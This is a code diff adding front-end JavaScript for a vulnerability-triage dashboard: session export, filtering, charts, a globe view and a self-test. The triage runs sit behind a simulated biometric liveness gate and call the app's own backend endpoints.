+function restore(){try{const d=JSON.parse(localStorage.getItem(LSK)||"null");if(!d)return;state.runs=d.runs||[];state.events=d.events||[];state.blocked=d.blocked||0;EVID=Math.max(0,...state.events.map(e=>e.id||0));if(state.events.length)toast("Restored "+state.events.length+" runs from this browser");}catch{}}
+function resetSession(){if(!confirm("Reset session? This clears all runs and saved history (the API key is never stored)."))return;
+  state.runs=[];state.events=[];state.blocked=0;state.last=null;state.phase="idle";state.lastGate=undefined;try{localStorage.removeItem(LSK);}catch{}
+  $("out").innerHTML='<div class="empty">Run a triage to see CVSS, ATT&amp;CK mapping and remediation.</div>';$("schemaPill").innerHTML="";$("outTs").textContent="—";$("flowTs").textContent="idle";
+  renderSession();renderKpis();toast("Session reset","ok");}
+function dl(name,text,type){const a=document.createElement("a");a.href=URL.createObjectURL(new Blob([text],{type}));a.download=name;document.body.appendChild(a);a.click();setTimeout(()=>{URL.revokeObjectURL(a.href);a.remove();},500);}
+function exportJSON(){if(!state.events.length)return toast("Nothing to export yet","warn");dl("vulntriage-session.json",JSON.stringify({exported:new Date().toISOString(),note:"demo runs are simulated",runs:state.events.map(e=>({id:e.id,time:e.time,tier:e.tier,mode:e.demo?"demo":"live",aura_fused:e.aura,blocked:e.blocked,schema_valid:e.valid,result:e.result,report:e.report}))},null,2),"application/json");toast("Exported JSON","ok");}
+function exportCSV(){if(!state.events.length)return toast("Nothing to export yet","warn");const q=v=>'"'+String(v??"").replace(/"/g,'""')+'"';
+  const rows=[["id","time","tier","mode","severity","cvss","technique","priority","effort","aura_fused","schema_valid","summary"]].concat(state.events.map(e=>[e.id,e.time,e.tier,e.demo?"demo":"live",e.severity,e.cvss,e.tech,e.result&&e.result.priority,e.result&&e.result.estimated_effort,e.aura,e.blocked?"":e.valid,e.result&&e.result.summary]));
+  dl("vulntriage-session.csv",rows.map(r=>r.map(q).join(",")).join("\n"),"text/csv");toast("Exported CSV","ok");}
+$("exportSel").onchange=e=>{const v=e.target.value;e.target.value="";if(v==="json")exportJSON();else if(v==="csv")exportCSV();else if(v==="reset")resetSession();};
+$("fxJson").onclick=$("sExpJ").onclick=exportJSON;$("fxCsv").onclick=$("sExpC").onclick=exportCSV;$("sReset").onclick=resetSession;
+$("sPersist").onchange=()=>{save();toast($("sPersist").checked?"Runs will persist in this browser":"Local persistence off");};
+
+// ---------- Filters / search / sort ----------
+var FL={q:"",sev:"",tier:"",sortA:{k:"id",d:-1},sortF:{k:"id",d:1}};
+function setFilter(k,v){FL[k]=FL[k]===v?"":v;if(k==="sev")$("sevFilter").value=FL.sev;renderKpis();renderTables();if(FL[k])toast(`Filter: ${k==="sev"?"severity":k} = ${v}`);}
+$("sevFilter").onchange=e=>{FL.sev=e.target.value;renderKpis();renderTables();};
+const onQ=v=>{FL.q=v.toLowerCase();$("gsearch").value!==v&&($("gsearch").value=v);$("fsearch").value!==v&&($("fsearch").value=v);renderKpis();renderTables();};
+$("gsearch").addEventListener("input",e=>onQ(e.target.value));$("fsearch").addEventListener("input",e=>onQ(e.target.value));
+$("gsearch").addEventListener("keydown",e=>{if(e.key==="Enter"){const f=filtered(FL.sortA);f.length?openDrawer(f[0]):toast("No matching runs","warn");}});
+function filtered(sort){let E=state.events.filter(e=>(!FL.sev||e.severity===FL.sev)&&(!FL.tier||e.tier===FL.tier)&&(!FL.q||[e.tier,e.severity,e.tech,e.time,e.report,JSON.stringify(e.result||{})].join(" ").toLowerCase().includes(FL.q)));
+  const K={id:e=>e.id,time:e=>e.ts||e.id,tier:e=>["nano","super","ultra"].indexOf(e.tier),severity:e=>["informational","low","medium","high","critical","blocked"].indexOf(e.severity),cvss:e=>e.cvss==null?-1:+e.cvss,tech:e=>e.tech||"",aura:e=>e.aura==null?-1:e.aura,schema:e=>e.blocked?-1:e.valid?1:0,mode:e=>e.demo?0:1,priority:e=>e.result&&e.result.priority||9,effort:e=>e.result?"SML".indexOf(e.result.estimated_effort):-1}[sort.k]||(e=>e.id);
+  return E.sort((a,b)=>{const x=K(a),y=K(b);return (x>y?1:x<y?-1:0)*sort.d||(a.id-b.id)*sort.d;});}
+function th(cols,sort,tbl){return "<thead><tr>"+cols.map(([k,l])=>`<th class="so" data-k="${k}" tabindex="0" aria-sort="${sort.k===k?(sort.d>0?"ascending":"descending"):"none"}">${l}</th>`).join("")+"</tr></thead>";}
+function wireTable(tbl,sort,rerender){tbl.querySelectorAll("th.so").forEach(h=>{const go=()=>{const k=h.dataset.k;if(sort.k===k)sort.d*=-1;else{sort.k=k;sort.d=-1;}rerender();tbl.querySelector(`th[data-k="${k}"]`).focus();};h.onclick=go;h.onkeydown=e=>{if(e.key==="Enter"||e.key===" "){e.preventDefault();go();}};});
+  tbl.querySelectorAll("tr.rw").forEach(r=>{const e=state.events.find(x=>x.id==r.dataset.id);r.onclick=()=>openDrawer(e);r.onkeydown=k=>{if(k.key==="Enter"||k.key===" "){k.preventDefault();openDrawer(e);}};});}
+const sevCell=e=>e.blocked?'<span class="pill no">blocked</span>':`<span class="sev" style="color:${SEV[e.severity]||"#7d8aa5"};background:${(SEV[e.severity]||"#7d8aa5")}1f">${esc(e.severity)}</span>`;
+function chips(){const c=[];if(FL.sev)c.push(["sev","severity: "+FL.sev]);if(FL.tier)c.push(["tier","tier: "+FL.tier]);if(FL.q)c.push(["q","search: "+FL.q]);
+  $("fchips").innerHTML=c.map(([k,l])=>`<button class="fchip" data-k="${k}" aria-label="Clear filter ${esc(l)}">${esc(l)} ✕</button>`).join("");
+  $("fchips").querySelectorAll(".fchip").forEach(b=>b.onclick=()=>{const k=b.dataset.k;if(k==="q")onQ("");else{FL[k]="";if(k==="sev")$("sevFilter").value="";renderKpis();renderTables();}});}
+function renderKpis(){if(!FL)return;const R=state.runs,E=state.events,avg=R.length?(R.reduce((a,r)=>a+r.cvss_score,0)/R.length).toFixed(1):"—",crit=R.filter(r=>r.severity==="critical").length;
+  const gated=E.filter(e=>e.aura!==null),pr=gated.length?Math.round(100*gated.filter(e=>!e.blocked).length/gated.length)+"%":"—",sv=R.length?R.filter(r=>r.valid).length+"/"+R.length:"—";
+  $("kpis").innerHTML=[["Triage runs",E.length,""],["Critical",crit,crit?"hot":""],["Avg CVSS",avg,""],["AURA pass rate",pr,""],["Tier",state.tier,""],["Schema-valid",sv,R.length&&R.some(r=>!r.valid)?"red":""]].map(([l,v,c])=>`<div class="kpi ${c}"><b>${esc(String(v))}</b><small>${l}</small></div>`).join("");
+  const F=filtered(FL.sortA);
+  $("actTbl").innerHTML=th([["time","Time"],["tier","Tier"],["severity","Severity"],["cvss","CVSS"],["tech","Technique"],["aura","AURA score"],["schema","Schema"],["mode","Mode"]],FL.sortA)+"<tbody>"+
+   (F.length?F.map(e=>`<tr class="rw" tabindex="0" data-id="${e.id}"><td>${e.time}</td><td>${e.tier}</td><td>${sevCell(e)}</td><td>${e.cvss??"—"}</td><td>${esc(e.tech||"—")}</td><td>${e.aura==null?"n/a":e.aura.toFixed(4)}</td><td>${e.blocked?"—":e.valid?'<span class="pill ok">valid</span>':'<span class="pill no">invalid</span>'}</td><td>${e.demo?"demo":"live"}</td></tr>`).join(""):`<tr><td colspan="8" style="color:var(--dim)">${E.length?"No runs match the current filters":"No runs yet — pick a sample and press Run triage (⌘/Ctrl+Enter)"}</td></tr>`)+"</tbody>";
+  wireTable($("actTbl"),FL.sortA,renderKpis);chips();}
+const _rt=renderTables;
+function renderTables(){if(!FL)return;_rtBase();const F=filtered(FL.sortF);
+  $("findTbl").innerHTML=th([["id","#"],["time","Time"],["severity","Severity"],["cvss","CVSS"],["tech","Technique"],["priority","Priority"],["effort","Effort"],["tier","Tier"],["mode","Source"]],FL.sortF)+"<tbody>"+
+   (F.length?F.map(e=>`<tr class="rw" tabindex="0" data-id="${e.id}"><td>${e.id}</td><td>${e.time}</td><td>${sevCell(e)}</td><td>${e.cvss??"—"}</td><td><code>${esc(e.tech||"—")}</code></td><td>${e.result&&e.result.priority?"P"+e.result.priority:"—"}</td><td>${e.result&&e.result.estimated_effort||"—"}</td><td>${e.tier}</td><td>${e.demo?"demo":"live"}</td></tr>`).join(""):'<tr><td colspan="9" style="color:var(--dim)">No findings yet — run a triage on the Triage tab.</td></tr>')+"</tbody>";
+  wireTable($("findTbl"),FL.sortF,renderTables);}
+function _rtBase(){
+  $("setTbl").innerHTML="<tr><th>Setting</th><th>Value</th></tr>"+[["Base URL",NEBIUS_BASE_URL],...Object.entries(MODEL_ROUTING).map(([k,v])=>["Tier "+k,v]),["Fallback tier","ultra"],["Temperature","0.0"],["Required keys",REQUIRED_KEYS.join(", ")]].map(([a,b])=>`<tr><td>${a}</td><td><code>${esc(b)}</code></td></tr>`).join("");
+  $("visTbl").innerHTML="<tr><th>Constant</th><th>Value</th></tr>"+[["REAL_GLINT_ARC_RATIO",REAL_GLINT_ARC_RATIO],["PHOTO_GLINT_ARC_RATIO",PHOTO_GLINT_ARC_RATIO],["GLINT_ACCEPT",GLINT_ACCEPT_LOW+" – "+GLINT_ACCEPT_HIGH],["MOUTH_MIN_PX / HIGH_ACC / CLIFF",MOUTH_MIN_PX+" / "+MOUTH_HIGH_ACC_PX+" / "+VISEME_CLIFF_PX],["LIPSYNC_ACCEPT",LIPSYNC_ACCEPT],["Weights close / range","0.65·0.35 / 0.30·0.70"],["Single-channel reweight","0.85 / 0.15"],["Fused threshold","0.85"],["TARGET_FALSE_ACCEPT","1e-5"]].map(([a,b])=>`<tr><td>${a}</td><td><code>${b}</code></td></tr>`).join("");}
+
+// ---------- Clickable charts ----------
+function donut(svg,leg,data){if(!FL)return;const tot=data.reduce((s,d)=>s+d[1],0);let a=-Math.PI/2,html="";const R=50,r=30;const key=svg.id==="dSev"?"sev":"tier";
+  if(!tot){svg.innerHTML=`<circle cx="60" cy="60" r="40" fill="none" stroke="#16203a" stroke-width="20"/><text x="60" y="64" fill="#56627c" font-size="11" text-anchor="middle">no runs</text>`;leg.innerHTML="";return;}
+  data.filter(d=>d[1]).forEach(([l,v,c])=>{const b=a+v/tot*Math.PI*2-0.0001;const L=b-a>Math.PI?1:0;const p=(rr,t)=>[60+rr*Math.cos(t),60+rr*Math.sin(t)];
+    const[x1,y1]=p(R,a),[x2,y2]=p(R,b),[x3,y3]=p(r,b),[x4,y4]=p(r,a);const on=FL[key]===l;
+    html+=`<path class="seg" data-f="${l}" d="M${x1} ${y1}A${R} ${R} 0 ${L} 1 ${x2} ${y2}L${x3} ${y3}A${r} ${r} 0 ${L} 0 ${x4} ${y4}Z" fill="${c}" opacity="${FL[key]&&!on?.35:.9}" stroke="${on?"#fff":"#0a1020"}" stroke-width="1.5"><title>${l}: ${v} run${v>1?"s":""} (${Math.round(v/tot*100)}%) — click to filter</title></path>`;a=b;});
+  svg.innerHTML=html+`<text x="60" y="58" fill="#e6ebf5" font-size="18" font-weight="600" text-anchor="middle" pointer-events="none">${tot}</text><text x="60" y="74" fill="#56627c" font-size="9" text-anchor="middle" letter-spacing="1" pointer-events="none">RUNS</text>`;
+  leg.innerHTML=data.map(([l,v,c])=>`<li tabindex="0" role="button" data-f="${l}" title="Click to filter the activity table" style="${FL[key]===l?"background:#13203a":""}"><i style="background:${c}"></i>${l}<em>${v} · ${Math.round(v/tot*100)}%</em></li>`).join("");
+  [...svg.querySelectorAll("path.seg"),...leg.querySelectorAll("li")].forEach(el=>{el.onclick=()=>{setFilter(key,el.dataset.f);renderSession();};el.onkeydown=e=>{if(e.key==="Enter"||e.key===" "){e.preventDefault();el.onclick();}};});}
+function bars(el,items){if(!FL)return;const m=Math.max(1,...items.map(i=>i[1]));const tierBars=el.id==="tierBars";
+  el.innerHTML=items.length?items.map(([l,v,s],i)=>`<li class="${tierBars?"clk":""}" ${tierBars?`tabindex="0" role="button" data-f="${["nano","super","ultra"][i]}"`:""} title="${esc(l)}: ${v}${tierBars?" — click to filter":""}"><span class="lb">${esc(l)}</span><span class="tr"><i style="width:${v/m*100}%"></i></span><em>${s??v}</em></li>`).join(""):'<li style="color:var(--dim)">No data</li>';
+  if(tierBars)el.querySelectorAll("li[data-f]").forEach(li=>{li.onclick=()=>{setFilter("tier",li.dataset.f);renderSession();};li.onkeydown=e=>{if(e.key==="Enter"||e.key===" "){e.preventDefault();li.onclick();}};});}
+
+// ---------- Tooltip helper ----------
+const TIP=$("tip");function showTip(x,y,html){TIP.innerHTML=html;TIP.style.display="block";const r=TIP.getBoundingClientRect();TIP.style.left=Math.min(innerWidth-r.width-8,x+14)+"px";TIP.style.top=Math.min(innerHeight-r.height-8,y+14)+"px";}
+function hideTip(){TIP.style.display="none";}
+
+// ---------- Globe interaction ----------
+const HB=$("holoBox");let dragP=null,moved=false;
+HB.addEventListener("pointerdown",e=>{if(e.target.closest(".hctl"))return;dragP=[e.clientX,e.clientY,GV.lon,GV.lat];moved=false;GV.drag=true;HB.classList.add("drag");HB.setPointerCapture(e.pointerId);});
+HB.addEventListener("pointermove",e=>{const b=HB.getBoundingClientRect(),x=e.clientX-b.left,y=e.clientY-b.top;
+  if(dragP){const dx=e.clientX-dragP[0],dy=e.clientY-dragP[1];if(Math.abs(dx)+Math.abs(dy)>3)moved=true;GV.lon=dragP[2]-dx*.35;GV.lat=Math.max(-70,Math.min(70,dragP[3]+dy*.35));if(REDUCE)drawHolo(performance.now());hideTip();return;}
+  const h=hitGlobe(x,y);if(h){HB.style.cursor="pointer";showTip(e.clientX,e.clientY,evTip(h.e));}else{HB.style.cursor="";hideTip();}});
+const endDrag=e=>{if(!dragP)return;dragP=null;GV.drag=false;HB.classList.remove("drag");
+  if(!moved){const b=HB.getBoundingClientRect(),h=hitGlobe(e.clientX-b.left,e.clientY-b.top);if(h){if(h.e.ref){GV.sel=h.e.ref;openDrawer(h.e.ref);}else toast("Demo-seed marker — simulated location, no run attached");}}};
+HB.addEventListener("pointerup",endDrag);HB.addEventListener("pointercancel",endDrag);HB.addEventListener("pointerleave",hideTip);
+HB.addEventListener("wheel",e=>{e.preventDefault();GV.zoom=Math.max(.6,Math.min(2.4,GV.zoom*(e.deltaY<0?1.1:1/1.1)));if(REDUCE)drawHolo(performance.now());},{passive:false});
+function hitGlobe(x,y){let best=null,bd=12;for(const h of GV.hits){const d=Math.hypot(h.x-x,h.y-y);if(d<bd){bd=d;best=h;}}return best;}
+function evTip(e){if(!e.ref)return `<b>Demo seed · ${e.sev}</b><br>Simulated location (demo) — no run attached`;const r=e.ref;
+  return `<b>${r.blocked?"Blocked at AURA gate":esc(r.severity)+" · CVSS "+r.cvss}</b><br>${esc(r.tech||"no triage")}<br>${r.time} · ${r.tier} · ${r.demo?"demo":"live"}<br><span style="color:var(--dim)">location simulated (demo) · click for details</span>`;}
+const setPause=p=>{GV.paused=p;$("hPause").textContent=p?"▶ resume":"❚❚ pause";$("hPause").setAttribute("aria-label",p?"Resume rotation":"Pause rotation");};
+$("hPause").onclick=()=>setPause(!GV.paused);$("hReset").onclick=()=>{GV.lon=-60;GV.lat=23.4;GV.zoom=1;GV.sel=null;toast("Globe view reset");};
+HB.tabIndex=0;HB.setAttribute("aria-label","Globe: arrow keys rotate, +/- zoom, space pause");
+HB.addEventListener("keydown",e=>{const m={ArrowLeft:()=>GV.lon+=8,ArrowRight:()=>GV.lon-=8,ArrowUp:()=>GV.lat=Math.min(70,GV.lat+5),ArrowDown:()=>GV.lat=Math.max(-70,GV.lat-5),"+":()=>GV.zoom=Math.min(2.4,GV.zoom*1.1),"=":()=>GV.zoom=Math.min(2.4,GV.zoom*1.1),"-":()=>GV.zoom=Math.max(.6,GV.zoom/1.1)," ":()=>setPause(!GV.paused)}[e.key];if(m){e.preventDefault();m();}});
+
+// ---------- Sankey hover / click ----------
+const FB=$("flow");const NODE_TIP={rep:"Report text → USER_TEMPLATE.format(report=…)",glint:"Corneal glint-arc channel (close range)",lip:"Lip-sync viseme channel (range)",nano:"nvidia/llama-3.1-nemotron-nano-8b-v1",super:"nvidia/llama-3.1-nemotron-70b-instruct",ultra:"nvidia/llama-3.1-nemotron-ultra-253b-v1 (default)",val:"_validate(): 8 keys, severity enum, CVSS 0–10, effort S/M/L, priority 1–5",cvss:"CVSS score 0–10",attck:"MITRE ATT&CK technique",rem:"Remediation steps (non-empty list)",pri:"Priority 1–5 · effort S/M/L"};
+function flowHit(e){const b=FB.getBoundingClientRect(),x=e.clientX-b.left,y=e.clientY-b.top;return Object.values(flow.nodes||{}).find(n=>Math.hypot(n.x-x,n.y-y)<20);}
+FB.addEventListener("mousemove",e=>{const n=flowHit(e);if(!n){FB.style.cursor="";hideTip();return;}FB.style.cursor="pointer";const v=verifySubmission(readings());
+  let extra="";if(["nano","super","ultra"].includes(n.id))extra=`<br>${state.events.filter(x=>x.tier===n.id).length} runs this session · click to select tier &amp; filter`;
+  else if(n.id==="glint"||n.id==="lip")extra=`<br>score ${(n.id==="glint"?v.glint_score:v.lipsync_score).toFixed(4)} · weight ${n.id==="glint"?v.channel_weights.glint:v.channel_weights.lipsync}<br>fused ${v.fused_score.toFixed(3)} → ${v.aura_passed?"PASS":"FAIL"} at 0.85`;
+  else if(state.last&&n.col===4)extra=`<br>latest: ${esc({cvss:state.last.cvss_score+" · "+state.last.severity,attck:state.last.attack_technique,rem:(state.last.remediation_steps||[]).length+" steps",pri:"P"+state.last.priority+" · effort "+state.last.estimated_effort}[n.id]||"")}`;
+  showTip(e.clientX,e.clientY,`<b>${esc(n.label)}</b><br>${esc(NODE_TIP[n.id]||"")}${extra}`);});
+FB.addEventListener("mouseleave",hideTip);
+FB.addEventListener("click",e=>{const n=flowHit(e);if(!n)return;if(["nano","super","ultra"].includes(n.id)){selectTier(n.id);setFilter("tier",n.id);renderSession();}else if(n.col===4&&state.events.length){openDrawer(state.events[state.events.length-1]);}else if(n.col===1)$("glint").focus();else if(n.id==="rep")$("report").focus();});
+function selectTier(t){const b=document.querySelector(`.tier[data-t="${t}"]`);b&&b.click();}
+
+// ---------- Drawer ----------
+let drEv=null,drPrev=null;
+function openDrawer(e){if(!e)return;drEv=e;drPrev=document.activeElement;const obj=e.result||{};const json=JSON.stringify(obj,null,2);
+  $("drTitle").textContent=e.blocked?"Run #"+e.id+" · blocked at AURA gate":`Run #${e.id} · ${e.severity} · CVSS ${e.cvss}`;
+  $("drMeta").innerHTML=`${e.time} · tier <b>${e.tier}</b> → <code>${esc(MODEL_ROUTING[e.tier])}</code> · ${e.demo?'<span class="tag">demo · simulated</span>':"live"} · AURA ${e.aura==null?"n/a":e.aura.toFixed(4)}`;
+  $("drJson").innerHTML=hl(json);$("drawer").classList.add("on");$("drawer").setAttribute("aria-hidden","false");$("drClose").focus();}
+function closeDrawer(){if(!$("drawer").classList.contains("on"))return;$("drawer").classList.remove("on");$("drawer").setAttribute("aria-hidden","true");drPrev&&drPrev.focus&&drPrev.focus();}
+$("drClose").onclick=closeDrawer;
+$("drCopy").onclick=async()=>{try{await navigator.clipboard.writeText(JSON.stringify(drEv.result,null,2));toast("JSON copied","ok");}catch{toast("Clipboard unavailable — select the JSON and copy manually","warn");}};
+$("drDl").onclick=()=>{dl(`vulntriage-run-${drEv.id}.json`,JSON.stringify(drEv.result,null,2),"application/json");toast("Downloaded run "+drEv.id+".json","ok");};
+$("drawer").addEventListener("keydown",e=>{if(e.key!=="Tab")return;const f=[...$("drawer").querySelectorAll("button")];if(e.shiftKey&&document.activeElement===f[0]){e.preventDefault();f[f.length-1].focus();}else if(!e.shiftKey&&document.activeElement===f[f.length-1]){e.preventDefault();f[0].focus();}});
+
+// ---------- Tabs (Visibility enlarges globe + flow by moving the same panels) ----------
+const homeSlot=$("pHolo").parentNode,flowNext=$("pFlow").nextSibling;
+function showTab(v){document.querySelectorAll(".tab").forEach(x=>{const on=x.dataset.v===v;x.classList.toggle("on",on);x.setAttribute("aria-selected",on);x.tabIndex=on?0:-1;});
+  document.querySelectorAll(".view").forEach(s=>s.classList.toggle("on",s.id==="v-"+v));
+  if(v==="visibility"){$("visSlot").append($("pHolo"),$("pFlow"));}else if($("pHolo").parentNode!==homeSlot){homeSlot.insertBefore($("pFlow"),flowNext);homeSlot.insertBefore($("pHolo"),$("pFlow"));}
+  $(".crumb")||0;document.querySelector(".crumb").textContent="/ "+v[0].toUpperCase()+v.slice(1);
+  renderTables();sizeAll();if(v==="settings")syncSettings();}
+document.querySelectorAll(".tab").forEach((t,i,all)=>{t.setAttribute("aria-controls","v-"+t.dataset.v);t.onclick=()=>showTab(t.dataset.v);
+  t.onkeydown=e=>{const d=e.key==="ArrowRight"?1:e.key==="ArrowLeft"?-1:0;if(d){const n=all[(i+d+all.length)%all.length];n.focus();showTab(n.dataset.v);}};});
+
+// ---------- Settings ----------
+function syncSettings(){$("sDemo").classList.toggle("on",!state.live);$("sLive").classList.toggle("on",state.live);$("sKey").value=$("apikey").value;$("sTier").value=state.tier;}
+const _setMode=setMode;
+$("sDemo").onclick=()=>{setMode(false);syncSettings();toast("Demo mode — simulated keyword engine");};
+$("sLive").onclick=()=>{setMode(true);syncSettings();toast("Live mode — key stays in memory; browser CORS may block calls","warn");};
+$("sKey").addEventListener("input",e=>{$("apikey").value=e.target.value;});$("apikey").addEventListener("input",e=>{$("sKey").value=e.target.value;});
+$("sTier").onchange=e=>{selectTier(e.target.value);toast("Default tier: "+e.target.value);};
+$("mDemo").addEventListener("click",syncSettings);$("mLive").addEventListener("click",syncSettings);$("statusPill").addEventListener("click",syncSettings);
+document.querySelectorAll(".tier").forEach(b=>b.addEventListener("click",()=>{$("sTier").value=state.tier;}));
+
+// ---------- Init ----------
+restore();renderSession();renderKpis();
+if(location.hash==="#demo")setTimeout(()=>$("runBtn").click(),200);
+
+// ---------- Self-test (?selftest) ----------
+if(new URLSearchParams(location.search).has("selftest"))setTimeout(async()=>{const res=[];const ok=(n,c)=>res.push([n,!!c]);
+  try{localStorage.removeItem(LSK);}catch{}state.runs=[];state.events=[];state.blocked=0;renderSession();renderKpis();
+  const near=(a,b)=>Math.abs(a-b)<1e-4;const V=(g,m,vis,d)=>verifySubmission({glint_arc_ratio:g,eye_width_px:120,mouth_width_px:m,viseme_match:vis,distance_hint:d});
+  // expected values computed from src/aura.py
+  ok("fuse close 0.52/120/0.92 = 0.8796 pass",near(V(.52,120,.92,"close").fused_score,.8796)&&V(.52,120,.92,"close").aura_passed);
+  ok("fuse range 0.52/120/0.92 = 0.6898 fail",near(V(.52,120,.92,"range").fused_score,.6898)&&!V(.52,120,.92,"range").aura_passed);
+  ok("fuse range 0.6/200/0.95 = 0.9225 pass",near(V(.6,200,.95,"range").fused_score,.9225));
+  ok("fuse photo 1.0 = 0.0357 fail",near(V(1,120,.92,"close").fused_score,.0357));
+  ok("fuse 0.52/40/0.5 = 0.3996 fail",near(V(.52,40,.5,"close").fused_score,.3996));
+  const exp={"SQL":"critical","Remote":"high","SSRF":"high","Stored":"medium","Path":"high","Auth":"critical"};
+  for(const [k,txt] of Object.entries(SAMPLES)){const r=demoResult(txt);let v=true;try{validate(r);}catch{v=false;}ok("demo schema-valid + severity: "+k.split(" ·")[0],v&&r.severity===exp[k.split(" ")[0]]);}
+  let bad=false;try{validate({severity:"x"});}catch{bad=true;}ok("validate rejects bad schema",bad);
+  ok("demo SQLi technique T1190",demoResult(SAMPLE).attack_technique.startsWith("T1190"));
+  ok("demo SSRF technique T1552.005",demoResult(SAMPLES["SSRF · webhook preview"]).attack_technique.startsWith("T1552.005"));
+  // UI run
+  sel.value=Object.keys(SAMPLES)[1];sel.onchange();$("glint").value=.52;$("mouth").value=120;$("vis").value=.92;setDist("close");$("auraOn").checked=true;$("auraOn").dispatchEvent(new Event("change"));
+  $("runBtn").click();await sleep(900);
+  ok("run adds event + run",state.events.length===1&&state.runs.length===1&&state.runs[0].severity==="high");
+  ok("activity table has row",$("actTbl").querySelectorAll("tr.rw").length===1);
+  ok("KPI shows 1 run",$("kpis").textContent.includes("1Triage runs"));
+  $("glint").value=1.0;$("glint").dispatchEvent(new Event("input"));
+  ok("slider live-updates fused + FAIL pill",$("aPill").textContent.includes("Rejected")&&$("fusedTxt").textContent==="0.036");
+  $("runBtn").click();await sleep(900);
+  ok("AURA fail stops at gate",state.events.length===2&&state.events[1].blocked&&state.phase==="fail"&&state.runs.length===1);
+  $("glint").value=.52;$("glint").dispatchEvent(new Event("input"));
+  setFilter("sev","blocked");ok("severity filter",$("actTbl").querySelectorAll("tr.rw").length===1);setFilter("sev","blocked");
+  onQ("T1190");ok("search filter",$("actTbl").querySelectorAll("tr.rw").length===1);onQ("");
+  $("actTbl").querySelector('th[data-k="cvss"]').click();ok("sortable header",$("actTbl").querySelector('th[data-k="cvss"]').getAttribute("aria-sort")!=="none");
+  $("actTbl").querySelector("tr.rw").click();ok("drawer opens with JSON",$("drawer").classList.contains("on")&&$("drJson").textContent.includes("aura"));
+  ok("localStorage persisted, no key",(localStorage.getItem(LSK)||"").includes("events")&&!(localStorage.getItem(LSK)||"").includes("v1."));
+  ok("globe hit targets",GV.hits.length>=1);
+  showTab("findings");ok("findings tab lists runs",$("findTbl").querySelectorAll("tr.rw").length===2);showTab("visibility");ok("visibility hosts globe",$("visSlot").contains($("holo")));showTab("triage");
+  ok("globe back on triage",$("v-triage").contains($("holo")));
+  const pass=res.every(r=>r[1]);const d=document.createElement("div");d.className="st "+(pass?"pass":"fail");d.id="selftest";
+  d.textContent=`SELFTEST ${pass?"PASS":"FAIL"} · ${res.filter(r=>r[1]).length}/${res.length}`+(pass?"":"\n"+res.filter(r=>!r[1]).map(r=>"✕ "+r[0]).join("\n"));document.body.appendChild(d);
+  console.log("SELFTEST "+(pass?"PASS":"FAIL")+" "+JSON.stringify(res));
+  if(new URLSearchParams(location.search).has("nodrawer"))closeDrawer();
+},400);
+
+</script>
+
+<script>
+// ---------- Backend wiring (app/server.py) ----------
+const BE={up:false};
+async function beCheck(){try{const r=await fetch("/api/health",{cache:"no-store"});BE.up=r.ok;const h=await r.json();$("beStat").textContent="online · "+(h.live_available?"live available":"demo engine");}catch{BE.up=false;$("beStat").textContent="offline → browser demo mode";}}
+async function post(u,b){const r=await fetch(u,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(b)});const j=await r.json();if(!r.ok)throw new Error(j.error||("HTTP "+r.status));return j;}
+async function loadRecords(){if(!BE.up)return;try{const {records}=await (await fetch("/api/records",{cache:"no-store"})).json();
+  $("recTs").textContent=records.length+" records · app/data/records.jsonl";
+  $("recTbl").innerHTML="<tr><th>Time</th><th>Gate</th><th>Posterior</th><th>Σ LLR</th><th>Legacy</th><th>Tiers L/HA</th><th>Vetoes</th><th>Challenge</th><th>Triage</th><th>Source</th></tr>"+records.slice().reverse().slice(0,30).map(r=>{const a=r.aura||{};const ev=a.evidence||{};
+   return `<tr data-id="${r.id}"><td>${esc(r.timestamp.replace("T"," ").slice(0,19))}</td><td>${r.blocked?'<span class="pill no">blocked</span>':'<span class="pill ok">pass</span>'}</td><td>${a.posterior!=null?(+a.posterior).toFixed(4):"—"}</td><td>${ev.total_llr!=null?(+ev.total_llr).toFixed(2):"—"}</td><td>${a.legacy_score!=null?(+a.legacy_score).toFixed(3):"—"}</td><td>${a.legacy_pass?"✓":"✕"} / ${a.high_assurance_pass?"✓":"✕"}</td><td>${esc((a.vetoes||[]).join(", ")||"—")}</td><td>${r.challenge_match_ratio!=null?(r.challenge_match_ratio*100).toFixed(0)+"%":"—"}</td><td>${r.blocked?"—":esc((r.triage.severity||"")+" · "+(r.triage.cvss_score??""))}</td><td>${esc((a.simulated?"sim:"+a.simulated:"camera")+" · "+r.engine)}</td></tr>`;}).join("");
+  $("recTbl").querySelectorAll("tr[data-id]").forEach(tr=>tr.onclick=()=>{const r=records.find(x=>x.id===tr.dataset.id);$("drJson").textContent=JSON.stringify(r,null,2);$("drTitle").textContent="Record "+r.id;$("drawer").classList.add("on");$("drawer").setAttribute("aria-hidden","false");});
+ }catch(e){}}
+$("recRefresh").onclick=loadRecords;
+const offlineRun=$("runBtn").onclick;
+$("runBtn").onclick=async()=>{const btn=$("runBtn");if(btn.disabled)return;
+  if(!BE.up||!$("auraOn").checked)return offlineRun();
+  const report=$("report").value;if(!report.trim()){toast("Paste a report or pick a sample first","warn");return;}
+  if(!$("consentChk").checked){toast("Consent required for the liveness scan","warn");return;}
+  btn.disabled=true;btn.textContent="Scanning…";const tier=state.tier;state.phase="run";state.t0=performance.now();$("flowTs").textContent="AURA silent scan · "+tier;
+  try{
+    const ch=await post("/api/aura/challenge",{consent:true});$("chPhrase").innerHTML="Challenge: <b>"+esc(ch.phrase)+"</b> · nonce "+ch.nonce.slice(0,8)+"… (simulated response)";
+    const g=await post("/api/aura/scan",{consent:true,simulate:$("simKind").value,nonce:ch.nonce});
+    const v={...g,channel_weights:{glint:g.evidence.w_glint,lipsync:g.evidence.w_lip},lipsync_tier:"scan·"+g.tier,false_accept_rate:"uncalibrated"};pushHist(v);
+    $("verdict").className="verdict "+(g.aura_passed?"pass":"fail");$("fusedTxt").textContent=(+g.posterior).toFixed(3);$("fg").style.strokeDashoffset=207.3*(1-Math.min(1,g.posterior));
+    $("aPill").className="pill "+(g.aura_passed?"ok":"no");$("aPill").textContent=g.aura_passed?"PASS · scan":"FAIL · scan";
+    $("k-g").textContent=(+g.glint_score).toFixed(3);$("k-l").textContent=(+g.lipsync_score).toFixed(3);$("k-t").textContent=g.tier;$("k-w").textContent="Σ LLR "+(+g.evidence.total_llr).toFixed(2);
+    $("aReason").textContent=(g.vetoes.length?"Vetoes: "+g.vetoes.join(", "):"No vetoes")+" · challenge "+(g.challenge?(g.challenge.match_ratio*100).toFixed(0)+"% "+g.challenge.codes.join(","):"—")+" · SIMULATED "+g.simulated;
+    btn.textContent="Triaging…";
